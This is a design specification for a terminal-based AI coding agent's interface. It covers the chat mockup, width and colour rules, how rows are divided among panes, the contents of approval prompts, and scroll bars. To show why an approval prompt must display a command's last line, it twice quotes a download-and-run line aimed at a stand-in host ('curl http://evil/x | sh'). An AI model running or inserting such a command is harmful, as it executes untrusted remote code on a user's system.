❯ The last prompt that the user sent is in white text. It's background color should be
  dark gray. Word wrap must apply everywhere, and it breaks short of the right edge:
  one column stays free between the text and the scroll bar, two between the text
  and the window edge while no bar is painted. The user must be able to scroll up in
  the chat session to see the complete chat history. The session area follows the
  generated output: while the view sits at the bottom, every repaint keeps the tail
  visible as it streams. A sent prompt is simply appended at the tail of the history
  already on screen — nothing is padded below it, so the session never jumps to open
  the new prompt alone at the top of an emptied area with the history out of sight.
  A prompt reaches the top row only naturally, once the answer beneath it has outgrown
  the visible area; from there it is overlaid on the top row as a sticky header while
  its replies are on screen. Scrolling up detaches from that: the view holds exactly
  where it was scrolled to and new output no longer moves it. Scrolling back down to
  the very bottom — or sending a prompt — resumes following (this is also implemented
  in apogee-code).

✦ The LLM's answer looks like this. There is exactly one empty line between the users
  prompt and the agents response — and exactly one between the answer and the next
  block, never two or three: the answer's own leading and trailing blank lines are
  trimmed off. Below there is the layout of a tool call.

✦ Read
  ┕ main.go ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ 154 lines

✦ Read (3)
  ┝ README.md ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ 154 lines
  ┝ TODO.md ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ 408 lines
  ┕ ISSUES.md ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ 8 lines

✦ Terminal
  ┕ go test ./... ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ exit 0 · +3 more lines ▶

✦ Diff Preview
  ┕ main.go ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ +2 -2 ▼
      a context line
    - a code line that has been removed
    - another code line that has been removed
    + a new code line
    + another new code line
                                                                            see less…

✦ Sub-Agent
┌─┶ survey the tests ✓ ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ 2 tool calls · 12k/32k · Found 4 gaps ▼
│
│ Survey the tests and report the gaps you find.
│
│ ✦ Read
│   ┕ a.go ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ 5 lines
│
│ ✦ Terminal
│   ┕ go test ./... ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ exit 0 · +3 more lines ▶

✦ This is the last message from the LLM. There must always be one empty line between
  chat content and the bottom prompt/information section like displayed here.

▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔ centered session name ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔
  ⠉⠹ reading · 3s                                              16k/32k 50% █████░░░░░
╭─────────────────────────────────────────────────────────────────────────────────────╮
│ Send a message…  ⏎ send · ⌥⏎ newline · ↑ recall · ⌃c quit                           │
│ This text box can be multiline. The text edit area auto increases height to         │
│ accomodate the bigger message. Clicking into this field should position the cursor  │
│ at the clicked position. The background color of this box is black. The border      │
│ of this prompt box are dark gray.                                                   │
╰─────────────────────────────────────────────────────────────────────────────────────╯
  workstation ✦ qwen3.6-27B-Q4_K_S.gguf ✦ ~/Repos/apogee                 ◐ ask before
▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁

---

## What "width" means everywhere below

**Every width in this document is the width the terminal actually paints.** "How many columns
does this string occupy" has two answers and they disagree: the grapheme-cluster measure counts
`⚠️` (an emoji carrying VARIATION SELECTOR-16) as two cells, the older wcwidth measure counts it
as one, and which of the two a terminal paints in is a capability it either announces at start-up
(mode 2027, "Unicode core") or never mentions. Apogee measures in whichever one its own painter
is using — the TUI's single **width authority**, which starts at wcwidth and follows the painter
to the grapheme measure the moment the terminal says so
([ADR 0030](docs/adr/0030-the-tui-has-one-width-authority-and-it-mirrors-the-painter.md),
`internal/tui/width.go`). So every rule below that says *width*, *column*, *wraps at* or *is
padded to* is stated in cells the terminal really shows — never in cells a library computed off
to one side.

**The prompt box is the one exception, on purpose.** The caret mirrors and the box's own height
mirror a third-party widget's internal wrap, and a mirror's oracle is the widget: they measure
the way that widget measures, whatever the painter chose. That is what makes the caret land under
the glyph the pointer is on.

---

## What "colour" means everywhere below

**Every colour in this document is a role, and the hex beside it is one scheme's answer.** Colours
come from the active **colour scheme**: one YAML file of 31 semantic roles, selected by
`ui.color-scheme`, shipped as `dark` and `light` and overridable per user from
`~/.apogee/schemes/` ([ADR 0040](docs/adr/0040-color-schemes-are-embedded-roles-with-user-shadowing.md),
`CONTEXT.md` §Color scheme). Every hex quoted below is the built-in **`dark`** scheme's value — what
apogee paints until someone picks another — and is named with the role key that carries it, so a
scheme swap moves all of them at once, live, with the screen repainted from scratch.

**What a scheme cannot do is change any shape in this document.** It recolours only what apogee
already colours: no full-screen background is painted, so the terminal's own background stays the
field everything below is drawn on, and no glyph, marker, width or row budget is themed. Two roles
are load-bearing rather than decorative and every shipped scheme is tested for them: `skill` and
`file-ref` must stay tellable apart (ADR 0027), as must the four `mode-*` tones.

---

## What "height" means: one row budget, and the transcript pays it

**Every pane above the input box takes its rows from the transcript.** The approval and ask
prompts, the `/sessions` browser, the `/model` | `/server` picker, the `/settings` pane, the
`/usage` report, the `/inspect` raw-protocol pane, the `/` and
`@` dropdown, and the staged-interjection band all sit in the frame between the session area and the bottom chrome,
and the session area is what shrinks to seat them. The frame is composed from ONE derivation of
how many rows are left over, so the rows the transcript is drawn on, the rows a mouse click may
address in it, and the rows an overlay paints are the same three answers to one question — a click
on a pane's border or on a session row selects nothing in the transcript, because there is no
transcript there.

**And a pane in that slot sits flush on the bottom chrome.** The frame spends exactly one blank gap
row, and it sits ABOVE the slot — between the session area and whatever comes next — so the approval
and ask prompts, the `/sessions` browser and the `/model` | `/server` picker each seat their bottom
border directly on the `▔` hairline, with no empty row painted against it. That is how the `/` and
`@` dropdown and the staged-interjection band already hug the input box from below, and the panes
above the hairline now read the same way rather than each carrying a spacer the others did not. With
no pane open nothing moves: the gap row still lands directly above the `▔`, exactly where it always
did. Which side of the slot the row falls on is a stacking question and not a budget one — the frame
spends the one row in every composition — so none of the arithmetic below knows about it.

**A short window shrinks the panes rather than pushing the box off-screen.** A pane never promises
rows the frame cannot hold: it spends what the window can spare above the input box, so a long
choice set on a half-height pane scrolls a smaller window around the selection, and on a window
too short for both, the pane keeps its rows and the session area goes to nothing. The input box
and the footer are never the ones that give way — they are the frame's floor. (The box's floor is
the box, not every row a draft grew it to: see the decision-surface rule below.)

**The budget is the FRAME's, not each surface's.** All of them are spending the same rows, so they
are allotted them together, once, before any of them is drawn — never each against the whole window
as though it were the only thing in it. A budget sized that way is exactly right one surface at a
time and wrong the moment two are open: a `/` menu typed while messages are queued asked for its
rows and the band asked for its six, and the frame that came out was four rows past the terminal's
last one, with the input box and the footer off the alternate screen. Which is a thing the human
does on purpose — the band is up because they are typing while the agent works, and the dropdown is
up because they are typing.

**So the surfaces give way in a fixed order, and the order is a claim about what the human is
doing.** The **session area** goes first and goes to nothing; then the **staged band**, which is a
reminder rather than a control, and whose count the status line is carrying anyway; then the
**`/` and `@` dropdown**, which a keystroke opened and a keystroke dismisses; then the
**`/inspect` raw-protocol pane**, a window onto a ring that keeps its records whether or not the
pane is drawn — reopened on a taller window it says exactly what it would have said; then the
**`/usage` report**, a question already answered; then the
**`/settings` pane**; then the **`/sessions` browser and the picker**; and last the **approval or ask
prompt**, which the run itself is blocked on. The footer is not in the division at all, and the input box is in it only at
its very end, and only for the prompt (below). Two panes can want the same rows, and on a window
that cannot seat both, the one further down that order is not drawn.

**A decision surface is never invisible while its keys are live.** The approval and ask prompts are
the two, and being last in the give-way order is not enough on its own, because the **input box**
was outside the order entirely: a three-line draft grew the box by two rows, the frame had four to
give above it, and the prompt fell off the allocation with `a`/`d`/`s` still answering it — the
whole of what the frame then said about the decision being `approval needed` on the status line, no
tool name. So the box's **extra draft rows** join the order, at the very end of it: the box always
keeps one content row, and the rows a draft grew it past that give way to the prompt — and, past
the order entirely, to the frame itself (below). "The input box never gives way" is about the box,
not about every row a draft grew it to —
the box is on the frame at every window size, and what the human was typing is still in it, drawn
on as many rows as the frame can pay for. The dropdown, the browser and the picker never take the
box's rows: the browser and the picker own the keyboard while they are open, so no draft can be
growing beside them, and the dropdown is a completion of the very draft it would be shrinking.
Below twelve rows there is no pane at all (see the four-row floor below), which is the floor of the
pane arrangement rather than an exception to this rule; the frame has a lower floor of its own, and
it is the last thing this section states.

**The box's extra rows give way to the FRAME as well, which is not a place in the order at all.**
The order above divides the rows the window can spare; the frame bound is about the window itself.
Every row a draft grows the box is a row taken out of the same window everything else is spending,
so past a point the box alone — no pane, no queue, nothing open — composes a frame past the
terminal's last line, and it did: a six-line message on a 12-row terminal put the footer two rows
off the screen, and a ten-line one did it to every terminal under eighteen rows. So the box is
capped at whatever leaves the frame inside the terminal, whether or not a prompt is up: five rows
on a 12-row terminal, one row on an 8-row one. The session area is what pays for those rows,
exactly as it pays for a pane's — it is first in the order and it goes to nothing.

**A capped box is a window onto the draft, and it says how much of it is out of sight.** The box
scrolls to keep the line the caret is on in view, and the draft ITSELF is never cut: it is what the
human typed, not prose apogee derived, and it is the one kind of content in the frame that cannot
be recovered from anywhere else. What the box is not drawing is counted on the box's own **top
border**, in the same `… (+N more lines)` marker every pane uses and on the same narrow ladder
(`… +3` where the full phrase does not fit). The border is the row the box always owns and that
carries nothing else — the box's title row in every way that counts — so the count costs the draft
no row. It differs from a pane's title row in one place only, at the bottom of the width ladder: a
pane sheds its NAME to keep its number, and this row has no name to shed, so under the width even
`… +3` needs, it stays a plain border rather than drawing a clipped count. `… +1` of `… +19` is not
a quieter statement of the fact; it is a false one.

**The frame's own floor is eight rows, and below it the frame is its floor and nothing more.** With
the session area gone the frame is one blank gap row, the `▔` hairline, the status line, the input
box (its two borders and its one content row), the footer's single line and the `▁` hairline under
it — eight rows, every one of them something the rules above forbid giving way. At exactly eight the
frame is that chrome and it fits. **Below eight it does not fit, and what it does there is
deliberate:** it composes its floor and no more. A long draft, a queued message or an open pane
cannot make it grow past eight on a seven-row terminal any more than on an eight-row one, so the
overflow is bounded at one row per row the terminal is short and never compounds. Clipping the frame
to the window instead was considered and rejected: it would make "the frame never exceeds the
terminal" trivially true at every size, and the next real overflow would then arrive silently
instead of failing a test.

**A pane that gives way entirely leaves its fact on the status line.** That is the band's licence
for disappearing — the `N queued` readout carries the count — and the status line therefore owes
that readout the same width discipline a pane's title row owes its count (below): the left slot is
composed **to** the window rather than composed long and clipped to it, so a narrow window sheds
the activity phrase around the count and never the count off the end of the row. The quiet qualifier
(below) is one rung lower still — it qualifies the phrase, so it is the first thing the slot gives
up, and it is dropped whole rather than truncated.

**A surface still gets its irreducible rows before any other surface gets a comfortable one.** Each
open pane's four (below) come off the top of the budget, so a passive band can never squeeze out
the pane being acted on; the band then takes what it wants out of what is left, which is why it
costs the session area rather than the pane beside it; the session area keeps a three-row reserve
out of the remainder; and only the surplus past all three makes a pane taller than its floor, split
evenly when more than one is open.

**The smallest honest pane is four rows, and what those four buy is the pane's own business.**
Four is the floor for every pane alike, because the allocation cannot know which rows a pane is
about to draw — a floor one row generous seats a pane that then fills it, where a floor one row
short would seat one that cannot be drawn. What differs is the chrome each pane spends out of them.
The `/sessions` browser, the picker and the dropdown spend all four — two borders, a title row and a
key hint — so at the floor they show no rows AND no prose, rather than keeping one row back for
either; they still say what they are and how to act, which is the least a pane can be and still be
worth drawing. The **approval prompt** spends two: its name rides the top border and it draws no
hint row at all, its shortcut letters being written beside the options they take, so the other two
rows are one line of body and one decision row. The **ask prompt** spends three — two borders and
its hint — and puts the fourth into the first line of the question, its name having gone into the
question itself; where the question is too long to be that one line, the row goes to the elision
marker and the question's lead moves up onto the border, which costs the pane nothing. What no pane
may do is claim a fifth row the frame has not got. Under the eight
rows of fixed chrome below the session area, that puts the shortest terminal a pane can be drawn in
at all at **twelve rows** — and at twelve the session area is already gone, so the frame is exactly
the pane and the chrome together.

**One pane may claim the whole budget: the full-height class.** Every pane above spends what the
window can *spare* — the session area keeps a three-row reserve, and only the surplus past it makes a
pane taller than its floor. `/settings` is the first pane for which that is the wrong division. It is
not a choice to scan beside a conversation but a **screen to read instead of one**: some thirty
configuration keys with their values, their section headers and their sources, which a scrolling
eight-row window turns into a keyhole. So while it is open the session area keeps **no reserve at
all** — the transcript gives way entirely, the way it already does on a short window, and every row
past the pane floors and the band's claim goes to the pane (ADR 0035). It takes those rows from the
**transcript** and never from a sibling: the even split of the surplus between open panes is
untouched, and in practice there is nothing to split with, because the verb is idle-only and the pane
swallows every keypress — no prompt, browser, picker or dropdown can be up beside it.

**Nothing else about a full-height pane is special, and that is the point.** Its irreducible height
is the same **four rows** every pane's is, spent the same way (two borders, a title row, a key hint);
below twelve rows it is not drawn at all, exactly as no pane is; the input box, the footer and both
hairlines are the frame's floor here as everywhere; and a draft the human has grown takes its rows
out of the same budget, so a long draft shrinks the pane rather than the box. Above the floor it
spends the rows in the pane's own order: the **rows first**, its body block — the **description
header**, which names what the key under the `❯` is for — kept ahead of them by the same claim the
ask prompt's question makes, so the caption is the line the pane would otherwise hand back. That
header is a **fixed-height region**: a `Description:` lead, at most **two lines** of the description
itself whatever it measures, and one blank line closing it off from the list, so walking the list
with `↑/↓` moves the highlight and nothing else (ADR 0037). A longer description loses its tail to
an `…` on the second line rather than the list losing a row to it. And when the frame can seat it
nowhere, it does what every surface that disappears owes: it **leaves its fact on the status line**.
For this pane the fact carries the way OUT as well — `settings — esc close` — because it is swallowing every
keypress on a window that is showing none of it, and a frame that went quiet there would read as an
idle session with a dead keyboard.

**The value sub-list is the one state in which a full-height pane is short.** When `⏎` on an enum key
turns the pane into the second step of its edit — the list of values that key may take (ADR 0035), or
the entries of `servers:` on the row that moves the session (ADR 0037) — the pane paints that handful
of rows and the ones it does not use go back to the **transcript** for as long as the question is
open. That is the budget rule working as written rather than an exception to
it: the grant is the whole budget, and a pane spends the rows it *has*. It is also right for what the
state is — four answers to one question, all on the screen at once, which is the approval menu's shape
and not a screen to read.

**The pane's other replaced state is a field, and it spends the budget the list would.** `⏎` on the
inline system prompt turns the row list into the **multi-line editor** its prose is written in
(ADR 0037): the same border, the same title and the same description header — which is already about
the key being written, because it describes the selected row — with the value's own lines where the
rows were, every one of them in the edit tone so the block reads as one field. Two things separate it
from a list. Its rows **wrap** rather than truncate, because a prompt line longer than the pane must
arrive whole where a key row is recognised from its start; and the scroll window follows the
**caret's** line rather than a selection, so the line being typed stays on screen in a prompt longer
than the pane can seat.

**Each step names its own keys on the hint row**, because the keys mean different things in each.
The key list reads `↑/↓ select · ⏎ edit · ⌫ reset · esc close` — the reset is named because it is
the one act of this pane no row advertises, and it removes a line from a file the human maintains by
hand. On the `server` row it reads `↑/↓ select · ⏎ edit · esc close` instead: that key's line is the
recording of a switch rather than a value the pane writes (ADR 0036 D2, ADR 0037 D5), so `⌫` is inert
there and a legend is the only place a human could have read that from. The value sub-list reads `↑/↓ select · ⏎ set · esc back`, the single-line buffer
`⏎ save · esc cancel`, and an armed reset `⏎ confirm reset · esc cancel` — the one line this pane
asks anything on, the `/sessions` delete-confirm posture with `⏎` in place of `y`. The multi-line
field reads `ctrl+s save · esc discard`, and it has to be read: `⏎` there belongs to the **value**,
which is the whole difference between that step and every other.

**What the approval prompt's body says is the call, in the call's own words.** The tool's raw name
rides the top border, a non-empty reason leads the body as `Reason: …`, and the arguments follow it
as LABELLED lines: one `name:` line per argument, the value's own lines hanging two spaces under it,
the arguments in the order the model wrote them. So a shell call reads

```
│ Reason: subprocess execution                                                 │
│ command:                                                                     │
│   cd /workspace/repos/apogee && git status                                   │
```

— the reason and the arguments adjacent, two labelled facts about one call, and a command that spans
several lines showing the lines it will actually run. The JSON object the arguments travelled in is
NOT drawn: no braces around the set, no quoted key names, no `\n` between one line of a command and
the next. That envelope is three things to read past on the one surface whose whole job is that the
fact is read, and it says nothing the labels do not. Nothing is dropped to buy that: EVERY argument
gets a label, so a workdir naming where a command runs is on the screen rather than summarised away,
and arguments with no names to label — a blob that does not parse, a value that is not an object at
all — are shown exactly as they arrived, since half a labelled body would be a claim about the call
the bytes do not support. Those unlabelled lines hang at the same two spaces a value does, because
this pane tells its own rows from the model's by the column they start in: a line of argument bytes
at column zero is indistinguishable from the `Reason:` the pane wrote, so no argument-derived line
is ever painted there — the bytes are all on the screen, two columns to the right of where a label
can live. A single value with no flat shape (a nested object, an array) is indented
JSON under its own label, which is the one place a brace still reaches this pane. All of it is
display: the arguments the tool receives are the ones the model sent, whatever shape they were read
in.

**A path that does not point where it reads is named on a line of its own.** When the call's path
argument resolves somewhere else — a `docs/` that is a symlink, a component pointing out of the
workspace — the pane keeps the argument exactly as the model wrote it and adds
`→ resolves to <where it lands>` under the arguments, as the body's last line. The two are separate
facts and the pane states both: swapping the argument for its resolution would answer a question
the approver did not ask and hide the one they did. The line is drawn ONLY when the two differ, so
the overwhelming majority of prompts — every path that names its own target — are unchanged. It is
the engine that decides there is something to say, because it is the engine that resolved the path
in the first place: this is the very target the blast-radius classification judged the call by, so
what you are shown and what the gate decided from cannot be two different readings. The same line,
in the same words, follows the target on the **tool card** in the transcript, and the write's own
result sentence names it too — three surfaces, one fact, so a call cannot read one way where you
approve it and another way where it is recorded.

**A call that reaches wider than its arguments say carries a `Scope:` line.** Some tools read more
than the argument they were handed — `diagnostics` takes one filename and its `go vet` half reads
every `.go` file in that file's package directory — and a body built from the arguments alone cannot
show it: "I approved `diagnostics.go`" and "it read the directory around `diagnostics.go`" are two
different sentences. The tool states the widening in one line of its own words, and the pane paints
it under the reason and above the arguments it widens, as `Scope: go vet reads the whole package
directory internal/tools — every .go file in it, not only diagnostics.go.` It is disclosure and
nothing else: what the call may do was already decided by the gate the `Reason:` names. Tools whose
arguments name their own reach — all but one of them today — declare nothing, so the line is absent
rather than blank and their prompts read exactly as they always have. The label is this pane's, like
`Reason:` and `Fix:`: the engine carries the bare sentence.

**An MCP prompt says how far `Always allow` reaches.** The session grant an MCP approval writes is
the SERVER's rather than the call's: allow `github__search` for the session and every other tool of
that `github` server runs unasked for the rest of it (ADR 0012). Nothing in the tool name or the
arguments says so — the call on the screen is one of the calls the yes authorises — so the pane says
it, on the body's last line, directly above the menu it is about: `Note: "Always allow" covers every
tool of MCP server "github" for this session`. A single server configured without an alias is still
one grant and reads `… covers every tool of this MCP server for this session`. It never shares a
pane with the `→ resolves to` line above: that one is an Apogee write tool's fact and this one is an
MCP server's. Every other prompt carries no note at all and is unchanged — a native tool's
allow-for-session is remembered against the call's own arguments, an MCP tool whose server cannot be
named degrades to the tool alone, and a dangerous-action speed-bump is remembered nowhere, so on all
three the yes authorises what the body already shows. Like `Reason:` and `Scope:` it is disclosure:
the grain was the engine's decision long before this pane started saying it out loud.

**When a sub-agent raised the call, the body says so first.** A request from a child leads with
`Sub-agent: <its delegated task>`, above the reason, because that is the one fact the rest of the
pane cannot supply: with several children running at once their prompts QUEUE — one on the screen at
a time, the asking child blocked and its siblings still working — and the tool name and the
arguments read exactly the same whichever of them sent it. When the delegation was **given a name**,
the line leads with it and keeps the task behind it — `Sub-agent: <its name> — <its delegated task>`
— because the name is what you recognise the asker by across a queue of siblings, while the task is
still the sentence saying what you are authorising on its behalf. The line is absent at depth 0,
where the top-level agent is the only thing that could be asking, so a session that never delegates
draws the pane it always drew. It is also the one string on this surface that is **clipped** rather
than wrapped in full, ellipsis and all: it says who is asking, and who is asking must never push
what is being decided off the screen. The clip is spent on the **whole** line, name included, so a
named request is never longer than an unnamed one.

**The ask prompt says it the same way, in the same words.** A question a sub-agent put to you leads
its body with the same `Sub-agent: …` line — name and task, or task alone — above the question,
under the same clip — because it answers the same question the approval pane's line does, and two decision surfaces
answering "which agent is this?" in two different ways would be a dialect rather than a design.
`ask_user` runs in a delegate exactly as it runs at the top level, so concurrent children can put
questions to you at the same moment; those questions **queue** on the one prompt surface just as
approvals do — one on the screen at a time, the asking child blocked and its siblings still working
— and the question's own words say nothing about which of them wrote them. The line is absent at
depth 0, so an undelegated session's box is the one it always drew.

**One prompt is on the screen at a time, and "one" counts both kinds together.** The approval pane
and the ask box are the same real estate and the same keyboard, so the queue behind them is a single
queue rather than one per kind: an approval and a question raised by two different children at the
same instant take their turn on that one surface, never both at once and never one replacing the
other mid-decision. This is not something the frame arranges — the engine hands the driver one
prompt at a time (a single slot both gates take, ADR 0039), so what is drawn here is always exactly
one pending decision, whichever kind it is, and whichever child is waiting on it. Nothing about the
undelegated session changes: with one agent asking there is never a second prompt to hold back.

**Inside a pane's own grant the rows come first — except where the prose IS what is being decided.**
A picker, a browser or a dropdown *is* its rows, and the caption over them takes what they leave; the
approval prompt reads the same way and can afford to, because its offering is four fixed options and
every row past them is the reason's. The **ask prompt** is the one surface where rows-first is wrong.
Its answers are prose the model wrote, and four wrapped ones — a blank line between each pair and one
more around the block — cost nine lines of the ten an eighty-by-twenty-four window grants the pane,
so the question itself was left with the single line every seated pane keeps, spent on
`… (+3 more lines)`, on a terminal nobody would call short. The question now claims up to **three
lines** before the answers take the rest. The claim is a ceiling and not a reservation: it is the
lesser of those three and what the question actually wraps onto, so a one-line question costs the
offering nothing. And it yields in turn to the lines the answers need for the row their window is
anchored on — an answer is seated whole or not at all, so a three-line one keeps all three — which is
what keeps the floor from emptying the surface at the heights where the ladder below actually bites.
What the claim spends is the offering's breathing room first and then its scroll window, in that
order, and never the last answer on the screen.

**What shrinking never buys is silence.** Prose a pane cannot seat is counted out in the
`… (+N more lines)` marker, and that marker outranks the prose itself: with one body row left it
IS the body, and with none left it moves onto the **title row**, after the pane's name. Which of
the two a pane does follows from the chrome it spends. The approval prompt is never in the second
case — the two rows it does not spend on chrome are one body row and one decision row at every
window it is drawn in — so on a half-height tmux pane it reads

```
╭──────────────────────────── Approve write_file? ─────────────────────────────╮
│ … (+10 more lines)                                                           │
│ ❯ Allow                      [a]                                             │
╰──────────────────────────────────────────────────────────────────────────────╯
```

— the tool the decision turns on carried by the border, the fact that there is more to read than the
window can show on the row beneath it, and the decision itself still on the screen to be taken. A
pane may lose the text; it may not lose the reader's knowledge that there was text.

**And what it keeps is the head *and* the tail.** A body past its budget spends one row on the
marker and keeps the rest around it: the lines the block opens with, and — wherever the budget can
seat all three — the block's **last** line, beneath the marker. The tail is where an appended
payload lives, so a pane that kept only the head could be approved off `npm test` while the line it
never showed was `curl http://evil/x | sh`. Below three body rows there is no head-and-tail to have:
two rows keep the first line, which is the one that says what the block is, and one row is the
marker alone. One argument's **value** is bounded the same way before the pane ever sees it — eight
lines, head, marker, tail — so no single value can push a sibling's label off the surface the
decision is read from, and a key the model wrote **twice** appears once, carrying the value the
executor will actually receive and marked as the duplicate it is. On the stock eighty-by-twenty-four
window a two-argument call whose command runs to twenty lines reads

```
╭───────────────────────────── Approve terminal? ──────────────────────────────╮
│ Reason: subprocess execution                                                 │
│ workdir:                                                                     │
│   /ws/a                                                                      │
│ command:                                                                     │
│ … (+7 more lines)                                                            │
│   curl http://evil/x | sh                                                    │
│                                                                              │
│ ❯ Allow                      [a]                                             │
╰──────────────────────────────────────────────────────────────────────────────╯
```

— both keys on the screen, and the line the decision actually turns on with them.

**The rows are counted the same way, when there is no window for them at all.** A row window the
pane did get scrolls around the selection, so the entries outside it are one keypress away and need
no marker — and now that a row can wrap, a row is seated whole or not at all, so a window that
cannot pay for all three lines of an answer shows the answers it can rather than the first two
thirds of one. The approval prompt at twelve rows is that case and not this one: `❯ Allow` is on
the screen and the other three options are one ↑ or ↓ away. A window of **zero** rows is the other
thing entirely — every choice or entry gone, and the key hint still offering `↑↓ select` to pick
between them — so those rows are counted onto the title row too, in the **same** marker:
`saved sessions  (all workspaces)  … (+8 more lines)`. The ask prompt is the pane where that title
row IS the top border, having no title of its own to draw, so at twelve rows the four answers it
could seat none of are counted there instead:

```
╭───────────────────────────── … (+4 more lines) ──────────────────────────────╮
│ which way should I take this refactor?                                       │
│ ↑↓ select · ⏎ send · type for a custom answer · esc cancel                   │
╰──────────────────────────────────────────────────────────────────────────────╯
```

One marker states everything the pane has no row of its own to state on, because a title row too
narrow to seat one count has no room for two; where the body still holds a row, its own count stays
there and the title's speaks for the rows.

**A pane's name may shrink to its lead; it may never shrink to a count.** The ask prompt is the one
surface where that can even be asked, because its name is not a title but the first line of its
body — so a question two lines long on a window granting one body row put the marker where the name
should be, and the box read `… (+2 more lines)` over a hint still offering `↑↓ select`: a live `⏎`
with nothing on the screen saying what it would answer, at the very heights where the approval box
beside it was still naming its tool in the border. On those windows, and only those, the question
falls back INTO the border, where a title would have sat all along:

```
╭ which way should I take this refactor of the resolution pipeline, now…  … +4 ╮
│ … (+2 more lines)                                                            │
│ ↑↓ select · ⏎ send · type for a custom answer · esc cancel                   │
╰──────────────────────────────────────────────────────────────────────────────╯
```

The row it costs is none: the border is drawn at every height anyway, and the count rides out beside
the name exactly as it does on a pane whose title was there from the start. The moment one line of
the question is back on a content row the border goes back to being unbroken — which is the ask
box's normal appearance, and the one its mockup draws. The question's floor above is what makes that
the normal case rather than the lucky one: the windows that still grant a single body row are the
short ones, not an ample terminal whose answers happened to be long.

**Narrowness does not buy silence either.** A half-height pane is usually a half-width one too, and
the title row is composed **to** the pane's width rather than composed long and clipped to it — a
clipped row would drop the count off its end and put the silence straight back. The width is spent
in the order the row is read for: the pane's name, then the count, then the words around the count.
So the marker sheds its noun before it sheds its number
(`saved sessions  (all workspaces)  … +8` from the low fifties down), and past that the **name** is
what gives way to an ellipsis (`saved session…  … +8` at 24 columns), never the number. On a pane
too narrow for even a clipped name, the count is the whole row — which is the ask prompt's border
wherever the question below it is on the screen, its name having gone into that question; where the
question is not on the screen at all, the border carries its lead instead and spends its width in
exactly this order, the lead clipping before the count does.

---

## The scroll bar and the column it hangs in

**`ui.show-scrollbar` decides whether either exists.** The wrap rule at the top of this document
is stated against the default, where the session area keeps a column down its right-hand edge for
the scroll bar and the bar is painted there once there is more transcript than window. With
`show-scrollbar: false` in `config.yaml`'s `ui:` block the column goes away **with** the bar
rather than staying behind as an empty stripe: the body takes that width back and the wrap rule
measures to the window edge instead, still stopping short of it by the free column the text always
keeps, so the text never touches the edge in either state. What the key hides is the indicator,
never the movement — scrolling works the same with the bar gone.

**It is one axis in two weights.** The track is a light vertical `│` and the thumb the heavy `┃`
above it, drawn in the same column and centred on the same stroke, so the bar reads as a single
line that thickens over the part of the transcript on screen rather than as a block sliding across
a hairline. The two tones do the rest of the work: the thumb takes the dim foreground the rest of
the chrome uses, the track the recessive one. Both glyphs are one cell wide, which is what lets the
column stay a single column.

**Every overflowing popup carries the same bar.** A bordered pane whose list is longer than the
window it was granted paints those same two weights down the last column *inside* its border —
the picker, the session browser, `/settings` and its sub-lists, `/usage`, `/inspect`, the dropdown,
the approval and ask prompts alike, because a windowed list that gives no sign of what it is holding
back is the same omission wherever it is drawn. The column is reserved **only while the list
overflows**: a pane whose rows all fit keeps its full inner width, so the bar appearing is itself
the statement that there is more, and nothing narrows for a list with nothing to scroll. The thumb
is sized and placed from the **rows** — the seated window over the whole list — and drawn in the
**lines** the row block was painted in, which is what keeps it flush at the top on the first row
and flush at the bottom on the last even where a row wraps to several lines. `ui.show-scrollbar`
governs both bars: switching the transcript's off takes the popups' with it, each pane giving the
column back to its rows exactly as the transcript gives it back to its body.

